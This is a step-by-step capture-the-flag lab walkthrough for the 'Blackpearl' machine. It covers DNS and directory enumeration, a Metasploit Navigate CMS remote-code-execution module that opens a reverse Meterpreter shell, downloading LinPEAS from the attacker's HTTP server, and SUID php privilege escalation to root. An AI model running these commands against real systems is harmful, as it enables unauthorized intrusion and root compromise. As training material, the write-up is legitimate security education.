# Blackpearl

Login in to the machine using the following credentials `root:tcm`.

Back on Kali. Let’s run an Nmap scan:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -T4 -p- -A 10.0.2.154
Starting Nmap 7.94 ( https://nmap.org ) at 2024-02-05 05:43 EST
Nmap scan report for 10.0.2.154
Host is up (0.00080s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.38 seconds
```

Only port 80 looks interesting. Accessing it from the browser leads to a nginx server default page.

Time to use `ffuf`  to enumerate directories using `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://10.0.2.154/FUZZ` 

Found a `secret`  directory. Access it using the browser by adding a `/secret`  after the IP address. Looks like a `secret`  file got downloaded.

Opening the secret file using the `cat` command gives us a message:

```bash
OMG you got r00t !

Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek
```

Next, lets use a tool called dnsrecon to enumerate our dns server. 

```bash
┌──(kali㉿kali)-[~]
└─$ dnsrecon -r 127.0.0.0/24 -n 10.0.2.154 -d whatev
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
```

`-r`  tag is used for localhost(our kali machine)

`-n`  for the machine we’re trying to scan for (blackpearl)

`-d`  for the domain(we can put whatever we want here for this task)

There’s a DNS pointer record for `blackpearl.tcm` 

We can add this to the `/etc/hosts` file using `nano /etc/hosts`.

![etc hosts.png](Blackpearl%2001371c3f2f18483488d4ba43d9cd4ef9/etc_hosts.png)

`CTRL + X`  then `y` to save. Restart the browser and search for `http://blackpearl.tcm` 

We have access to a PHP info page.

Let’s use `ffuf`  to enumerate the host for any directories using `ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ`.

There’s another directory `/navigate`. Access it through the browser:

![navigate login.png](Blackpearl%2001371c3f2f18483488d4ba43d9cd4ef9/navigate_login.png)

We have a CMS login page. Time to google for exploits and/or default credentials.

There’s a few exploits. Including [this](https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/), with instructions on how to exploit it using metasploit.

Boot up metasploit using `msfconsole`:

```bash
msf6 >  use exploit/multi/http/navigate_cms_rce
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/navigate_cms_rce) > options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.4         yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.

msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 10.0.2.154
rhosts => 10.0.2.154
msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
vhost => blackpearl.tcm
msf6 exploit(multi/http/navigate_cms_rce) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic

msf6 exploit(multi/http/navigate_cms_rce) > run

[*] Started reverse TCP handler on 10.0.2.4:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39927 bytes) to 10.0.2.154
[*] Meterpreter session 1 opened (10.0.2.4:4444 -> 10.0.2.154:56942) at 2024-02-05 06:53:07 -0500

meterpreter > shell
Process 757 created.
Channel 1 created.
whoami
www-data
```

Looks like the exploit worked. But we got the shell as a normal user, which means it’s time for some privilege escalation.

But first, it’s a good thing to stabilize our shell by generating a tty shell. We can learn how to do that [here](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell). Copy the first line and paste it into the shell.

NOTE: It’s advised to change  `/bin/sh` to `/bin/bash/`.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'   
www-data@blackpearl:~/blackpearl.tcm/navigate$
```

That’s better.

Now we can go through the normal process of finding privilege escalation capabilities (using `sudo -l` , `history` etc.) and of course the trusty `LinPEAS`. Time to move it over to the target machine.

On Kali:

```bash
┌──(kali㉿kali)-[~]
└─$ cd transfer 
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/transfer]
└─$ ls
linpeas.sh  pspy64  winpeas.exe  Wise.exe
                                                                                                                                                                                             
┌──(kali㉿kali)-[~/transfer]
└─$ python3 -m http.server 80                                   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Back in the shell:

```bash
pwd
/var/www/blackpearl.tcm/navigate
www-data@blackpearl:~/blackpearl.tcm/navigate$ cd /tmp
cd /tmp
www-data@blackpearl:/tmp$ wget http://10.0.2.4/linpeas.sh linpeas.sh
```

Press ENTER. Give the file execute permissions with `chmod +x linpeas/sh` and execute with `./linpeas.sh`.

Lots of information to go through. But what we are looking for this time is, this:

![linpeas blackpearl.png](Blackpearl%2001371c3f2f18483488d4ba43d9cd4ef9/linpeas_blackpearl.png)

In nutshell, in the SUID persmission area. Whenever there's an `s` e.g `-rws`  , that means we can run whatever is tied to that permission as the user that owns it. So if we have a binary owned by root and it has the `s` permssion, we can run it as root.

We can use the find command to list out binaries with the SUID permission settings we are looking for in a much cleaner way.

 

```bash
www-data@blackpearl:/tmp$ find / -type f -perm -4000 2>/dev/null
find / -type f -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/php7.3
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
```

[GTFOBins](https://gtfobins.github.io/) can provide us with ways to exploit certain binaries with specific permissions to gain root.

Access the website. Select `SUID`. We can start looking for binaries to exploit based on the list above. In this case, let’s look for php, select it and scroll down to SUID:

![SUID.png](Blackpearl%2001371c3f2f18483488d4ba43d9cd4ef9/SUID.png)

Copy the highlighted line and paste it into the shell. Make sure to include the location of the binary first. like so:

```bash
/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
```

Press enter and we should spawn a shell as root:

```bash
# id 
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
flag.txt
# cat flag.txt
cat flag.txt
Good job on this one.
Finding the domain name may have been a little guessy,
but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
```

Awesome!! 😎